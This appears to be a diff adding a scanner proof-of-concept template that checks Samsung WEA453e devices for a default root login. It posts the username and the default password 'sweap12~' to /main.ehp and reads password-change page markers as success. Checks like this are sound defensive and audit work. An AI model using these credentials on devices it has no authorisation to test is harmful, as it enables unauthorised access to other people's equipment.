@@ -1,0 +1,22 @@
+id: poc-yaml-samsung-wea453e-default-pwd
+info:
+  name: Samsung Wea453e Default Pwd
+  severity: medium
+  tags:
+  - 弱口令
+  finger: Samsung Wea
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: POST
+  path: /main.ehp
+  headers: {}
+  data: httpd;General;lang=en&login_id=root&login_pw=sweap12~
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, "document.formParent2.changepasswd1.value")
+    && contains(body, "passwd_change.ehp")
+  output: []
